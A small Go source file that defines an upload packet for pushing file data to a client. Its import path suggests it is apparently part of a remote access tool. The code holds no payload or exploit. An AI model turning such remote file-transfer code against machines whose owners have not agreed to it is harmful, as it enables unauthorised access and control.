package main

import (
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type UploadPacket struct {
	File  string `network:"send"`
	Final bool   `network:"send"`
	Data  []byte `network:"send"`
}

func (packet UploadPacket) Header() header.PacketHeader {
	return header.UploadToClientHeader
}

func (packet UploadPacket) Init(c *Client) {

}

func (packet UploadPacket) OnReceive(c *Client) error {
	return nil
}

func (packet UploadPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
